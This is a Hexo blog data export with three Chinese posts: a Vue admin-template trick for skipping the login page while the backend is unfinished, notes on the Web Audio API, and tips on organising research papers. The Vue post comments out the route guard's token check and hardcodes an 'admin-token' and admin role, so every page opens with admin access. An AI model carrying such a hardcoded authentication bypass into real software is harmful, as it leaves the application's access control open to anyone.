class=\"hljs-string\">&#x27;@/utils/auth&#x27;</span> <span class=\"hljs-comment\">// get token from cookie</span><br><span class=\"hljs-keyword\">import</span> getPageTitle <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;@/utils/get-page-title&#x27;</span><br><br><span class=\"hljs-title class_\">NProgress</span>.<span class=\"hljs-title function_\">configure</span>(&#123; <span class=\"hljs-attr\">showSpinner</span>: <span class=\"hljs-literal\">false</span> &#125;) <span class=\"hljs-comment\">// NProgress Configuration</span><br><br><span class=\"hljs-keyword\">const</span> whiteList = [<span class=\"hljs-string\">&#x27;/login&#x27;</span>] <span class=\"hljs-comment\">// no redirect whitelist</span><br><br>router.<span class=\"hljs-title function_\">beforeEach</span>(<span class=\"hljs-keyword\">async</span> (to, <span class=\"hljs-keyword\">from</span>, next) =&gt; &#123;<br>  <span class=\"hljs-comment\">// start progress bar</span><br>  <span class=\"hljs-title class_\">NProgress</span>.<span class=\"hljs-title function_\">start</span>()<br><br>  <span class=\"hljs-comment\">// set page title</span><br>  <span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-property\">title</span> = <span class=\"hljs-title function_\">getPageTitle</span>(to.<span class=\"hljs-property\">meta</span>.<span class=\"hljs-property\">title</span>)<br><br>  <span class=\"hljs-comment\">// determine whether the user has logged in</span><br>  <span class=\"hljs-comment\">// const hasToken = getToken()</span><br><br>  <span class=\"hljs-comment\">// if (hasToken) &#123;</span><br>  <span class=\"hljs-comment\">//   if (to.path === &#x27;/login&#x27;) &#123;</span><br>  <span class=\"hljs-comment\">//     // if is logged in, redirect to the home page</span><br>  <span class=\"hljs-comment\">//     next(&#123; path: &#x27;/&#x27; &#125;)</span><br>  <span class=\"hljs-comment\">//     NProgress.done()</span><br>  <span class=\"hljs-comment\">//   &#125; else &#123;</span><br>  <span class=\"hljs-comment\">//     const hasGetUserInfo = store.getters.name</span><br>  <span class=\"hljs-comment\">//     if (hasGetUserInfo) &#123;</span><br>  <span class=\"hljs-comment\">//       next()</span><br>  <span class=\"hljs-comment\">//     &#125; else &#123;</span><br>  <span class=\"hljs-comment\">//       try &#123;</span><br>  <span class=\"hljs-comment\">//         // get user info</span><br>  <span class=\"hljs-comment\">//         // await store.dispatch(&#x27;user/getInfo&#x27;)</span><br><br>  <span class=\"hljs-comment\">//         next()</span><br>  <span class=\"hljs-comment\">//       &#125; catch (error) &#123;</span><br>  <span class=\"hljs-comment\">//         // remove token and go to login page to re-login</span><br>  <span class=\"hljs-comment\">//         await store.dispatch(&#x27;user/resetToken&#x27;)</span><br>  <span class=\"hljs-comment\">//         Message.error(error || &#x27;Has Error&#x27;)</span><br>  <span class=\"hljs-comment\">//         next(`/login?redirect=$&#123;to.path&#125;`)</span><br>  <span class=\"hljs-comment\">//         NProgress.done()</span><br>  <span class=\"hljs-comment\">//       &#125;</span><br>  <span class=\"hljs-comment\">//     &#125;</span><br>  <span class=\"hljs-comment\">//   &#125;</span><br>  <span class=\"hljs-comment\">// &#125; else &#123;</span><br>  <span class=\"hljs-comment\">//   /* has no token*/</span><br><br>  <span class=\"hljs-comment\">//   if (whiteList.indexOf(to.path) !== -1) &#123;</span><br>  <span class=\"hljs-comment\">//     // in the free login whitelist, go directly</span><br>  <span class=\"hljs-comment\">//     next()</span><br>  <span class=\"hljs-comment\">//   &#125; else &#123;</span><br>  <span class=\"hljs-comment\">//     // other pages that do not have permission to access are redirected to the login page.</span><br>  <span class=\"hljs-comment\">//     next(`/login?redirect=$&#123;to.path&#125;`)</span><br>  <span class=\"hljs-comment\">//     NProgress.done()</span><br>  <span class=\"hljs-comment\">//   &#125;</span><br>  <span class=\"hljs-comment\">// &#125;</span><br><br>  <span class=\"hljs-comment\">//跳过登录，设置默认的token，然后输入其中一个路由进入页面</span><br>  <span class=\"hljs-keyword\">const</span> hasToken = <span class=\"hljs-string\">&#x27;admin-token&#x27;</span><br>  <span class=\"hljs-keyword\">const</span> role = <span class=\"hljs-string\">&#x27;admin&#x27;</span><br>  <span class=\"hljs-keyword\">if</span> (hasToken) &#123;<br>    <span class=\"hljs-title function_\">next</span>()<br>    <span class=\"hljs-keyword\">const</span> accessRoutes = <span class=\"hljs-keyword\">await</span> store.<span class=\"hljs-title function_\">dispatch</span>(<span class=\"hljs-string\">&#x27;permission/generateRoutes&#x27;</span>, role)<br>    <span class=\"hljs-comment\">// dynamically add accessible routes</span><br>    router.<span class=\"hljs-title function_\">addRoutes</span>(accessRoutes)<br>  &#125;<br>&#125;)<br><br>router.<span class=\"hljs-title function_\">afterEach</span>(<span class=\"hljs-function\">() =&gt;</span> &#123;<br>  <span class=\"hljs-comment\">// finish progress bar</span><br>  <span class=\"hljs-title class_\">NProgress</span>.<span class=\"hljs-title function_\">done</span>()<br>&#125;)<br></code></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Vue-登录页面跳过\"><a href=\"#Vue-登录页面跳过\" class=\"headerlink\" title=\"Vue 登录页面跳过\"></a>Vue 登录页面跳过</h1><h3 id=\"1-业务需求\"><a href=\"#1-业务需求\" class=\"headerlink\" title=\"1.业务需求\"></a>1.业务需求</h3><ul>\n<li>后端暂时无法提供接口</li>\n<li>需要查看前端页面效果</li>\n</ul>\n<h3 id=\"2-方法\"><a href=\"#2-方法\" class=\"headerlink\" title=\"2.方法\"></a>2.方法</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">/*</span><br><span class=\"hljs-comment\"> * @Author: Aruver</span><br><span class=\"hljs-comment\"> * @Date: 2022-10-08 09:45:03</span><br><span class=\"hljs-comment\"> * @LastEditors: Aruver</span><br><span class=\"hljs-comment\"> * @qq: 37919926</span><br><span class=\"hljs-comment\"> */</span><br><span class=\"hljs-keyword\">import</span> router <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;./router&#x27;</span><br><span class=\"hljs-keyword\">import</span> store <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;./store&#x27;</span><br><span class=\"hljs-keyword\">import</span> &#123; <span class=\"hljs-title class_\">Message</span> &#125; <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;element-ui&#x27;</span><br><span class=\"hljs-keyword\">import</span> <span class=\"hljs-title class_\">NProgress</span> <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;nprogress&#x27;</span> <span class=\"hljs-comment\">// progress bar</span><br><span class=\"hljs-keyword\">import</span> <span class=\"hljs-string\">&#x27;nprogress/nprogress.css&#x27;</span> <span class=\"hljs-comment\">// progress bar style</span><br><span class=\"hljs-keyword\">import</span> &#123; getToken &#125; <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;@/utils/auth&#x27;</span> <span class=\"hljs-comment\">// get token from cookie</span><br><span class=\"hljs-keyword\">import</span> getPageTitle <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;@/utils/get-page-title&#x27;</span><br><br><span class=\"hljs-title class_\">NProgress</span>.<span class=\"hljs-title function_\">configure</span>(&#123; <span class=\"hljs-attr\">showSpinner</span>: <span class=\"hljs-literal\">false</span> &#125;) <span class=\"hljs-comment\">// NProgress Configuration</span><br><br><span class=\"hljs-keyword\">const</span> whiteList = [<span class=\"hljs-string\">&#x27;/login&#x27;</span>] <span class=\"hljs-comment\">// no redirect whitelist</span><br><br>router.<span class=\"hljs-title function_\">beforeEach</span>(<span class=\"hljs-keyword\">async</span> (to, <span class=\"hljs-keyword\">from</span>, next) =&gt; &#123;<br>  <span class=\"hljs-comment\">// start progress bar</span><br>  <span class=\"hljs-title class_\">NProgress</span>.<span class=\"hljs-title function_\">start</span>()<br><br>  <span class=\"hljs-comment\">// set page title</span><br>  <span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-property\">title</span> = <span class=\"hljs-title function_\">getPageTitle</span>(to.<span class=\"hljs-property\">meta</span>.<span class=\"hljs-property\">title</span>)<br><br>  <span class=\"hljs-comment\">// determine whether the user has logged in</span><br>  <span class=\"hljs-comment\">// const hasToken = getToken()</span><br><br>  <span class=\"hljs-comment\">// if (hasToken) &#123;</span><br>  <span class=\"hljs-comment\">//   if (to.path === &#x27;/login&#x27;) &#123;</span><br>  <span class=\"hljs-comment\">//     // if is logged in, redirect to the home page</span><br>  <span class=\"hljs-comment\">//     next(&#123; path: &#x27;/&#x27; &#125;)</span><br>  <span class=\"hljs-comment\">//     NProgress.done()</span><br>  <span class=\"hljs-comment\">//   &#125; else &#123;</span><br>  <span class=\"hljs-comment\">//     const hasGetUserInfo = store.getters.name</span><br>  <span class=\"hljs-comment\">//     if (hasGetUserInfo) &#123;</span><br>  <span class=\"hljs-comment\">//       next()</span><br>  <span class=\"hljs-comment\">//     &#125; else &#123;</span><br>  <span class=\"hljs-comment\">//       try &#123;</span><br>  <span class=\"hljs-comment\">//         // get user info</span><br>  <span class=\"hljs-comment\">//         // await store.dispatch(&#x27;user/getInfo&#x27;)</span><br><br>  <span class=\"hljs-comment\">//         next()</span><br>  <span class=\"hljs-comment\">//       &#125; catch (error) &#123;</span><br>  <span class=\"hljs-comment\">//         // remove token and go to login page to re-login</span><br>  <span class=\"hljs-comment\">//         await store.dispatch(&#x27;user/resetToken&#x27;)</span><br>  <span class=\"hljs-comment\">//         Message.error(error || &#x27;Has Error&#x27;)</span><br>  <span class=\"hljs-comment\">//         next(`/login?redirect=$&#123;to.path&#125;`)</span><br>  <span class=\"hljs-comment\">//         NProgress.done()</span><br>  <span class=\"hljs-comment\">//       &#125;</span><br>  <span class=\"hljs-comment\">//     &#125;</span><br>  <span class=\"hljs-comment\">//   &#125;</span><br>  <span class=\"hljs-comment\">// &#125; else &#123;</span><br>  <span class=\"hljs-comment\">//   /* has no token*/</span><br><br>  <span class=\"hljs-comment\">//   if (whiteList.indexOf(to.path) !== -1) &#123;</span><br>  <span class=\"hljs-comment\">//     // in the free login whitelist, go directly</span><br>  <span class=\"hljs-comment\">//     next()</span><br>  <span class=\"hljs-comment\">//   &#125; else &#123;</span><br>  <span class=\"hljs-comment\">//     // other pages that do not have permission to access are redirected to the login page.</span><br>  <span class=\"hljs-comment\">//     next(`/login?redirect=$&#123;to.path&#125;`)</span><br>  <span class=\"hljs-comment\">//     NProgress.done()</span><br>  <span class=\"hljs-comment\">//   &#125;</span><br>  <span class=\"hljs-comment\">// &#125;</span><br><br>  <span class=\"hljs-comment\">//跳过登录，设置默认的token，然后输入其中一个路由进入页面</span><br>  <span class=\"hljs-keyword\">const</span> hasToken = <span class=\"hljs-string\">&#x27;admin-token&#x27;</span><br>  <span class=\"hljs-keyword\">const</span> role = <span class=\"hljs-string\">&#x27;admin&#x27;</span><br>  <span class=\"hljs-keyword\">if</span> (hasToken) &#123;<br>    <span class=\"hljs-title function_\">next</span>()<br>    <span class=\"hljs-keyword\">const</span> accessRoutes = <span class=\"hljs-keyword\">await</span> store.<span class=\"hljs-title function_\">dispatch</span>(<span class=\"hljs-string\">&#x27;permission/generateRoutes&#x27;</span>, role)<br>    <span class=\"hljs-comment\">// dynamically add accessible routes</span><br>    router.<span class=\"hljs-title function_\">addRoutes</span>(accessRoutes)<br>  &#125;<br>&#125;)<br><br>router.<span class=\"hljs-title function_\">afterEach</span>(<span class=\"hljs-function\">() =&gt;</span> &#123;<br>  <span class=\"hljs-comment\">// finish progress bar</span><br>  <span class=\"hljs-title class_\">NProgress</span>.<span class=\"hljs-title function_\">done</span>()<br>&#125;)<br></code></pre></td></tr></table></figure>\n"},{"title":"Web Audio API","date":"2023-06-26T13:13:45.000Z","mp3":null,"cover":"img/bg3.jpg","_content":"\n# Web Audio API\n\n![](https://img-blog.csdnimg.cn/20200116182807152.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N3YWxsb3dibGFuaw==,size_16,color_FFFFFF,t_70)\n\n### 实现功能\n\n可视化、音色合成器、动态混音、声音特效、3D空间音频、均衡器、环境混响\n\n## 一、基础使用\n\n### 1.AudioContext\n\n为音频处理提供一个上下文环境，相当于一个中央控制器，控制音频路由的各个模块；\n\n### 1.1音频结点AudioNode\n\n音频路由中的基本单位，工作依赖于AudioContext，音频结点拥有自己的输入输出，通过connect方法将一个节点的输出连接到另一个结点的输入。\n\n```js\naudioBufferSourceNode.connect(audioContext.destination)\n```\n\n- Souce Node:能产生音频的结点，只有输出没有输入\n- Process Node:能对音频进行处理的结点，有多个输入和输出\n- Destination Node:通常为音频播放设备\n\n![img](https://pic3.zhimg.com/80/v2-35137da2f4932f059a1cfbb7ca291c8e_1440w.webp)\n\n有的音频处理节点会有多个输出，比如ChannelSplitterNode，可以将音频拆分为多个声道，对应的，也有一个合并声道的节点ChannelMergerNode，有多个输入和一个输出。\n\n### 1.2 路由图\n\n\n\n","source":"_posts/Web Audio.md","raw":"---\ntitle: Web Audio API\ndate: 2023-06-26 21:13:45\ncategories:\n  - 前端\ntags:\n  - JS\n  - 笔记\n  - TS\nmp3:\ncover: img/bg3.jpg\n---\n\n# Web Audio API\n\n![](https://img-blog.csdnimg.cn/20200116182807152.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N3YWxsb3dibGFuaw==,size_16,color_FFFFFF,t_70)\n\n### 实现功能\n\n可视化、音色合成器、动态混音、声音特效、3D空间音频、均衡器、环境混响\n\n## 一、基础使用\n\n### 1.AudioContext\n\n为音频处理提供一个上下文环境，相当于一个中央控制器，控制音频路由的各个模块；\n\n### 1.1音频结点AudioNode\n\n音频路由中的基本单位，工作依赖于AudioContext，音频结点拥有自己的输入输出，通过connect方法将一个节点的输出连接到另一个结点的输入。\n\n```js\naudioBufferSourceNode.connect(audioContext.destination)\n```\n\n- Souce Node:能产生音频的结点，只有输出没有输入\n- Process Node:能对音频进行处理的结点，有多个输入和输出\n- Destination Node:通常为音频播放设备\n\n![img](https://pic3.zhimg.com/80/v2-35137da2f4932f059a1cfbb7ca291c8e_1440w.webp)\n\n有的音频处理节点会有多个输出，比如ChannelSplitterNode，可以将音频拆分为多个声道，对应的，也有一个合并声道的节点ChannelMergerNode，有多个输入和一个输出。\n\n### 1.2 路由图\n\n\n\n","slug":"Web Audio","published":1,"updated":"2023-07-03T09:35:40.499Z","_id":"cljf1dojt0003ak9c1qa4dtlr","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"Web-Audio-API\"><a href=\"#Web-Audio-API\" class=\"headerlink\" title=\"Web Audio API\"></a>Web Audio API</h1><p><img src=\"https://img-blog.csdnimg.cn/20200116182807152.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N3YWxsb3dibGFuaw==,size_16,color_FFFFFF,t_70\"></p>\n<h3 id=\"实现功能\"><a href=\"#实现功能\" class=\"headerlink\" title=\"实现功能\"></a>实现功能</h3><p>可视化、音色合成器、动态混音、声音特效、3D空间音频、均衡器、环境混响</p>\n<h2 id=\"一、基础使用\"><a href=\"#一、基础使用\" class=\"headerlink\" title=\"一、基础使用\"></a>一、基础使用</h2><h3 id=\"1-AudioContext\"><a href=\"#1-AudioContext\" class=\"headerlink\" title=\"1.AudioContext\"></a>1.AudioContext</h3><p>为音频处理提供一个上下文环境，相当于一个中央控制器，控制音频路由的各个模块；</p>\n<h3 id=\"1-1音频结点AudioNode\"><a href=\"#1-1音频结点AudioNode\" class=\"headerlink\" title=\"1.1音频结点AudioNode\"></a>1.1音频结点AudioNode</h3><p>音频路由中的基本单位，工作依赖于AudioContext，音频结点拥有自己的输入输出，通过connect方法将一个节点的输出连接到另一个结点的输入。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">audioBufferSourceNode.<span class=\"hljs-title function_\">connect</span>(audioContext.<span class=\"hljs-property\">destination</span>)<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>Souce Node:能产生音频的结点，只有输出没有输入</li>\n<li>Process Node:能对音频进行处理的结点，有多个输入和输出</li>\n<li>Destination Node:通常为音频播放设备</li>\n</ul>\n<p><img src=\"https://pic3.zhimg.com/80/v2-35137da2f4932f059a1cfbb7ca291c8e_1440w.webp\" alt=\"img\"></p>\n<p>有的音频处理节点会有多个输出，比如ChannelSplitterNode，可以将音频拆分为多个声道，对应的，也有一个合并声道的节点ChannelMergerNode，有多个输入和一个输出。</p>\n<h3 id=\"1-2-路由图\"><a href=\"#1-2-路由图\" class=\"headerlink\" title=\"1.2 路由图\"></a>1.2 路由图</h3>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Web-Audio-API\"><a href=\"#Web-Audio-API\" class=\"headerlink\" title=\"Web Audio API\"></a>Web Audio API</h1><p><img src=\"https://img-blog.csdnimg.cn/20200116182807152.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N3YWxsb3dibGFuaw==,size_16,color_FFFFFF,t_70\"></p>\n<h3 id=\"实现功能\"><a href=\"#实现功能\" class=\"headerlink\" title=\"实现功能\"></a>实现功能</h3><p>可视化、音色合成器、动态混音、声音特效、3D空间音频、均衡器、环境混响</p>\n<h2 id=\"一、基础使用\"><a href=\"#一、基础使用\" class=\"headerlink\" title=\"一、基础使用\"></a>一、基础使用</h2><h3 id=\"1-AudioContext\"><a href=\"#1-AudioContext\" class=\"headerlink\" title=\"1.AudioContext\"></a>1.AudioContext</h3><p>为音频处理提供一个上下文环境，相当于一个中央控制器，控制音频路由的各个模块；</p>\n<h3 id=\"1-1音频结点AudioNode\"><a href=\"#1-1音频结点AudioNode\" class=\"headerlink\" title=\"1.1音频结点AudioNode\"></a>1.1音频结点AudioNode</h3><p>音频路由中的基本单位，工作依赖于AudioContext，音频结点拥有自己的输入输出，通过connect方法将一个节点的输出连接到另一个结点的输入。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">audioBufferSourceNode.<span class=\"hljs-title function_\">connect</span>(audioContext.<span class=\"hljs-property\">destination</span>)<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>Souce Node:能产生音频的结点，只有输出没有输入</li>\n<li>Process Node:能对音频进行处理的结点，有多个输入和输出</li>\n<li>Destination Node:通常为音频播放设备</li>\n</ul>\n<p><img src=\"https://pic3.zhimg.com/80/v2-35137da2f4932f059a1cfbb7ca291c8e_1440w.webp\" alt=\"img\"></p>\n<p>有的音频处理节点会有多个输出，比如ChannelSplitterNode，可以将音频拆分为多个声道，对应的，也有一个合并声道的节点ChannelMergerNode，有多个输入和一个输出。</p>\n<h3 id=\"1-2-路由图\"><a href=\"#1-2-路由图\" class=\"headerlink\" title=\"1.2 路由图\"></a>1.2 路由图</h3>"},{"title":"如何高效整理论文","date":"2023-06-27T23:51:45.000Z","mp3":null,"cover":"img/bg17.jpg","_content":"\n# 如何高效整理论文？\n\nhttps://www.bilibili.com/video/BV1354y1h7Vf/?spm_id_from=333.337.search-card.all.click&vd_source=f47a1518b7d14573404f9ef42bc4a40b\n\n## 一、目标\n\n- 了解科研进程，把握研究方向\n- 了解课题下，大家已经做的研究\n- 帮助自己写论文，完善科研思维\n\n## 二、论文基本结构\n\n### 1.综述\n\n- 发展现状\n- 原因\n- 意义\n- 关键词\n\n> 以上部分一层一层相关，查看引用的相关文献\n\n### 2.假设\n\n### 3.实验设计（\\*\\*\\*）\n\n在同一实验目标、实验假设的情况下，能否设计其他更好的实验？\n\n### 4.数据处理\n\n- 筛入\n- 剔出\n\n> 删选数据的标准好不好？有没有更好的完善方式？（实验对比可发小论文）\n\n- 处理方式（统计学方式，数学部分补充）\n- 关键词\n\n### 5.结论\n\n对于当前课题 A，有哪些假设？有哪些实验？有哪些实验数据？如何提出新的假设->新的实验->发现创新点\n\n### 6.局限性分析\n\n改进方法、创新方法...\n\n## 三、其他\n\n- 询问老师：整理成 Excel 表格：论文名、链接、问题、索引...\n- 论文检索\n\n### 四、总结\n\n- 单篇文献整理\n- 多篇文献整合\n- 文献汇报与求助\n","source":"_posts/如何高效整理论文？.md","raw":"---\ntitle: 如何高效整理论文\ndate: 2023-06-28 07:51:45\ncategories:\n  - 日常\ntags:\n  - 科研\nmp3:\ncover: img/bg17.jpg\n---\n\n# 如何高效整理论文？\n\nhttps://www.bilibili.com/video/BV1354y1h7Vf/?spm_id_from=333.337.search-card.all.click&vd_source=f47a1518b7d14573404f9ef42bc4a40b\n\n## 一、目标\n\n- 了解科研进程，把握研究方向\n- 了解课题下，大家已经做的研究\n- 帮助自己写论文，完善科研思维\n\n## 二、论文基本结构\n\n### 1.综述\n\n- 发展现状\n- 原因\n- 意义\n- 关键词\n\n> 以上部分一层一层相关，查看引用的相关文献\n\n### 2.假设\n\n### 3.实验设计（\\*\\*\\*）\n\n在同一实验目标、实验假设的情况下，能否设计其他更好的实验？\n\n### 4.数据处理\n\n- 筛入\n- 剔出\n\n> 删选数据的标准好不好？有没有更好的完善方式？（实验对比可发小论文）\n\n- 处理方式（统计学方式，数学部分补充）\n- 关键词\n\n### 5.结论\n\n对于当前课题 A，有哪些假设？有哪些实验？有哪些实验数据？如何提出新的假设->新的实验->发现创新点\n\n### 6.局限性分析\n\n改进方法、创新方法...\n\n## 三、其他\n\n- 询问老师：整理成 Excel 表格：论文名、链接、问题、索引...\n- 论文检索\n\n### 四、总结\n\n- 单篇文献整理\n- 多篇文献整合\n- 文献汇报与求助\n","slug":"如何高效整理论文？","published":1,"updated":"2023-06-28T01:25:21.647Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cljf1dok30005ak9cbuitc4ht","content":"<h1 id=\"如何高效整理论文？\"><a href=\"#如何高效整理论文？\" class=\"headerlink\" title=\"如何高效整理论文？\"></a>如何高效整理论文？</h1><p><a href=\"https://www.bilibili.com/video/BV1354y1h7Vf/?spm_id_from=333.337.search-card.all.click&amp;vd_source=f47a1518b7d14573404f9ef42bc4a40b\">https://www.bilibili.com/video/BV1354y1h7Vf/?spm_id_from=333.337.search-card.all.click&amp;vd_source=f47a1518b7d14573404f9ef42bc4a40b</a></p>\n<h2 id=\"一、目标\"><a href=\"#一、目标\" class=\"headerlink\" title=\"一、目标\"></a>一、目标</h2><ul>\n<li>了解科研进程，把握研究方向</li>\n<li>了解课题下，大家已经做的研究</li>\n<li>帮助自己写论文，完善科研思维</li>\n</ul>\n<h2 id=\"二、论文基本结构\"><a href=\"#二、论文基本结构\" class=\"headerlink\" title=\"二、论文基本结构\"></a>二、论文基本结构</h2><h3 id=\"1-综述\"><a href=\"#1-综述\" class=\"headerlink\" title=\"1.综述\"></a>1.综述</h3><ul>\n<li>发展现状</li>\n<li>原因</li>\n<li>意义</li>\n<li>关键词</li>\n</ul>\n<blockquote>\n<p>以上部分一层一层相关，查看引用的相关文献</p>\n</blockquote>\n<h3 id=\"2-假设\"><a href=\"#2-假设\" class=\"headerlink\" title=\"2.假设\"></a>2.假设</h3><h3 id=\"3-实验设计（-）\"><a href=\"#3-实验设计（-）\" class=\"headerlink\" title=\"3.实验设计（***）\"></a>3.实验设计（***）</h3><p>在同一实验目标、实验假设的情况下，能否设计其他更好的实验？</p>\n<h3 id=\"4-数据处理\"><a href=\"#4-数据处理\" class=\"headerlink\" title=\"4.数据处理\"></a>4.数据处理</h3><ul>\n<li>筛入</li>\n<li>剔出</li>\n</ul>\n<blockquote>\n<p>删选数据的标准好不好？有没有更好的完善方式？（实验对比可发小论文）</p>\n</blockquote>\n<ul>\n<li>处理方式（统计学方式，数学部分补充）</li>\n<li>关键词</li>\n</ul>\n<h3 id=\"5-结论\"><a href=\"#5-结论\" class=\"headerlink\" title=\"5.结论\"></a>5.结论</h3><p>对于当前课题 A，有哪些假设？有哪些实验？有哪些实验数据？如何提出新的假设-&gt;新的实验-&gt;发现创新点</p>\n<h3 id=\"6-局限性分析\"><a href=\"#6-局限性分析\" class=\"headerlink\" title=\"6.局限性分析\"></a>6.局限性分析</h3><p>改进方法、创新方法…</p>\n<h2 id=\"三、其他\"><a href=\"#三、其他\" class=\"headerlink\" title=\"三、其他\"></a>三、其他</h2><ul>\n<li>询问老师：整理成 Excel 表格：论文名、链接、问题、索引…</li>\n<li>论文检索</li>\n</ul>\n<h3 id=\"四、总结\"><a href=\"#四、总结\" class=\"headerlink\" title=\"四、总结\"></a>四、总结</h3><ul>\n<li>单篇文献整理</li>\n<li>多篇文献整合</li>\n<li>文献汇报与求助</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"如何高效整理论文？\"><a href=\"#如何高效整理论文？\" class=\"headerlink\" title=\"如何高效整理论文？\"></a>如何高效整理论文？</h1><p><a href=\"https://www.bilibili.com/video/BV1354y1h7Vf/?spm_id_from=333.337.search-card.all.click&amp;vd_source=f47a1518b7d14573404f9ef42bc4a40b\">https://www.bilibili.com/video/BV1354y1h7Vf/?spm_id_from=333.337.search-card.all.click&amp;vd_source=f47a1518b7d14573404f9ef42bc4a40b</a></p>\n<h2 id=\"一、目标\"><a href=\"#一、目标\" class=\"headerlink\" title=\"一、目标\"></a>一、目标</h2><ul>\n<li>了解科研进程，把握研究方向</li>\n<li>了解课题下，大家已经做的研究</li>\n<li>帮助自己写论文，完善科研思维</li>\n</ul>\n<h2 id=\"二、论文基本结构\"><a href=\"#二、论文基本结构\" class=\"headerlink\" title=\"二、论文基本结构\"></a>二、论文基本结构</h2><h3 id=\"1-综述\"><a href=\"#1-综述\" class=\"headerlink\" title=\"1.综述\"></a>1.综述</h3><ul>\n<li>发展现状</li>\n<li>原因</li>\n<li>意义</li>\n<li>关键词</li>\n</ul>\n<blockquote>\n<p>以上部分一层一层相关，查看引用的相关文献</p>\n</blockquote>\n<h3 id=\"2-假设\"><a href=\"#2-假设\" class=\"headerlink\" title=\"2.假设\"></a>2.假设</h3><h3 id=\"3-实验设计（-）\"><a href=\"#3-实验设计（-）\" class=\"headerlink\" title=\"3.实验设计（***）\"></a>3.实验设计（***）</h3><p>在同一实验目标、实验假设的情况下，能否设计其他更好的实验？</p>\n<h3 id=\"4-数据处理\"><a href=\"#4-数据处理\" class=\"headerlink\" title=\"4.数据处理\"></a>4.数据处理</h3><ul>\n<li>筛入</li>\n<li>剔出</li>\n</ul>\n<blockquote>\n<p>删选数据的标准好不好？有没有更好的完善方式？（实验对比可发小论文）</p>\n</blockquote>\n<ul>\n<li>处理方式（统计学方式，数学部分补充）</li>\n<li>关键词</li>\n</ul>\n<h3 id=\"5-结论\"><a href=\"#5-结论\" class=\"headerlink\" title=\"5.结论\"></a>5.结论</h3><p>对于当前课题 A，有哪些假设？有哪些实验？有哪些实验数据？如何提出新的假设-&gt;新的实验-&gt;发现创新点</p>\n<h3 id=\"6-局限性分析\"><a href=\"#6-局限性分析\" class=\"headerlink\" title=\"6.局限性分析\"></a>6.局限性分析</h3><p>改进方法、创新方法…</p>\n<h2 id=\"三、其他\"><a href=\"#三、其他\" class=\"headerlink\" title=\"三、其他\"></a>三、其他</h2><ul>\n<li>询问老师：整理成 Excel 表格：论文名、链接、问题、索引…</li>\n<li>论文检索</li>\n</ul>\n<h3 id=\"四、总结\"><a href=\"#四、总结\" class=\"headerlink\" 